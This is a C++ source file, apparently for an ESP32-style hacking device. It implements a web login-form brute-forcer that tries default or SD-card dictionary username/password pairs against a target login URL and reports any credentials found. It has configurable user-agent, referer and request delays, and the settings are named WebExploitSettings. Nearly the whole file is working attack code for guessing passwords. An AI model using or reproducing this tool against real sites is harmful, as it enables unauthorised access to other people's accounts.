// form_brute.cpp
#include "form_brute.h"
#include <SD.h> // Include if SD card support is compiled

// Default short dictionary (example)
const std::vector<String> default_usernames = {"admin", "user", "test"};
const std::vector<String> default_passwords = {"admin", "password", "12345", "test"};

FormBrute::FormBrute() : _progressCallback(nullptr) {
    // Constructor
}

std::vector<String> FormBrute::extractOtherFormParams(const String& formPageHtml, const std::vector<String>& excludeParams) {
    std::vector<String> otherParams;
    // Simplified: Real implementation needs HTML parsing for CSRF tokens, hidden fields etc.
    return otherParams;
}

String FormBrute::constructPostData(String userParam, String username, String passParam, String password, const std::vector<String>& otherFormParams) {
    String postData = userParam + "=" + username + "&" + passParam + "=" + password;
    for (const String& param : otherFormParams) {
        postData += "&" + param; // Assuming params are already in "name=value" format
    }
    return postData;
}

// Updated sendLoginAttempt to use WebExploitSettings
String FormBrute::sendLoginAttempt(String loginUrl, String userParam, String username, String passParam, String password, const WebExploitSettings& settings) {
    String response = "";
    http.begin(loginUrl);
    http.setUserAgent(settings.currentUserAgent);
    if (!settings.currentReferer.isEmpty()) {
        http.addHeader("Referer", settings.currentReferer);
    }
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setTimeout(10000); // 10 seconds timeout
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");

    std::vector<String> otherParams; // Placeholder
    String post_data = constructPostData(userParam, username, passParam, password, otherParams);
    
    int httpCode = http.POST(post_data);

    if (httpCode > 0) {
        response = http.getString();
    } else {
        response = "Error on HTTP request: " + http.errorToString(httpCode);
    }
    http.end();
    return response;
}

bool FormBrute::checkLoginSuccess(const String& responseContent, const String& successIdentifier) {
    if (responseContent.startsWith("Error on HTTP request:")) return false;
    if (successIdentifier.startsWith("NOT:")) {
        return responseContent.indexOf(successIdentifier.substring(4)) == -1;
    } else {
        return responseContent.indexOf(successIdentifier) != -1;
    }
}

std::vector<String> FormBrute::loadDictionary(fs::FS &fs, const String& path) {
    std::vector<String> list;
    File file = fs.open(path.c_str());
    if (!file || file.isDirectory()) {
        if (_progressCallback) _progressCallback(0, "", "Error: Could not open dictionary file: " + path);
        return list;
    }
    while (file.available()) {
        String line = file.readStringUntil(\'\n\');
        line.trim();
        if (!line.isEmpty()) {
            list.push_back(line);
        }
    }
    file.close();
    return list;
}

// Updated beginTest to use WebExploitSettings
String FormBrute::beginTest(String targetUrl, String loginUrl, String userParam, String passParam, String successIdentifier, const std::vector<String>& usernames, const std::vector<String>& passwords, const WebExploitSettings& settings, FormBruteProgressCallback progressCallback) {
    _progressCallback = progressCallback;
    String resultLog = "Form Brute Test Started.\nTarget Form URL: " + loginUrl + "\n";
    resultLog += "User Param: " + userParam + ", Pass Param: " + passParam + "\n";
    resultLog += "Success Identifier: " + successIdentifier + "\n";
    resultLog += "User-Agent: " + settings.currentUserAgent + "\n";
    if (!settings.currentReferer.isEmpty()) resultLog += "Referer: " + settings.currentReferer + "\n";
    resultLog += "Request Delay: " + String(settings.requestDelayMs) + "ms (Random: " + (settings.useRandomDelay ? "Yes" : "No") + ")\n";

    const std::vector<String>& usersToTest = usernames.empty() ? default_usernames : usernames;
    const std::vector<String>& passesToTest = passwords.empty() ? default_passwords : passwords;

    if (usersToTest.empty() || passesToTest.empty()) {
        resultLog += "Error: Username or password list is empty.\n";
        if (_progressCallback) _progressCallback(100, "", "Error: Username or password list empty.");
        return resultLog;
    }

    long totalAttempts = usersToTest.size() * passesToTest.size();
    long currentAttemptNum = 0;

    for (const String& user : usersToTest) {
        for (const String& pass : passesToTest) {
            currentAttemptNum++;
            String currentAttemptStr = user + ":" + pass;
            if (_progressCallback) {
                int percentage = (totalAttempts > 0) ? (currentAttemptNum * 100 / totalAttempts) : 0;
                _progressCallback(percentage, currentAttemptStr, "Trying...");
            }
            
            delay(settings.getEffectiveDelay()); // Use configured delay

            String response = sendLoginAttempt(loginUrl, userParam, user, passParam, pass, settings);
            
            if (response.startsWith("Error on HTTP request:")) {
                resultLog += "Attempt " + currentAttemptStr + ": " + response + "\n";
                continue; 
            }

            if (checkLoginSuccess(response, successIdentifier)) {
                resultLog += "SUCCESS! Credentials found: Username = " + user + ", Password = " + pass + "\n";
                resultLog += "Response snippet: " + response.substring(0, min(200, (int)response.length())) + "...\n";
                if (_progressCallback) _progressCallback(100, currentAttemptStr, "SUCCESS! " + user + ":" + pass);
                return resultLog + "Form Brute Test Finished (Success).\n";
            }
        }
    }

    resultLog += "Form Brute Test Finished. No credentials found with the provided lists and identifier.\n";
    if (_progressCallback) _progressCallback(100, "", "Finished. No credentials found.");
    return resultLog;
}

// Updated beginTestWithDictionary to use WebExploitSettings
String FormBrute::beginTestWithDictionary(String targetUrl, String loginUrl, String userParam, String passParam, String successIdentifier, String dictionaryPath, bool isUsernameList, const WebExploitSettings& settings, FormBruteProgressCallback progressCallback) {
    _progressCallback = progressCallback;
    String resultLog = "Form Brute Test Started with Dictionary.\nTarget Form URL: " + loginUrl + "\n";
    resultLog += "Dictionary Path: " + dictionaryPath + "\n";

    if (!SD.begin()) {
        resultLog += "Error: Failed to initialize SD card.\n";
        if (_progressCallback) _progressCallback(100, "", "Error: SD Card init failed.");
        return resultLog;
    }

    std::vector<String> dictList = loadDictionary(SD, dictionaryPath);
    if (dictList.empty()) {
        resultLog += "Error: Dictionary file is empty or could not be read: " + dictionaryPath + "\n";
        if (_progressCallback) _progressCallback(100, "", "Error: Dictionary empty/unreadable.");
        return resultLog;
    }

    if (isUsernameList) {
        return beginTest(targetUrl, loginUrl, userParam, passParam, successIdentifier, dictList, default_passwords, settings, progressCallback);
    } else {
        return beginTest(targetUrl, loginUrl, userParam, passParam, successIdentifier, default_usernames, dictList, settings, progressCallback);
    }
}

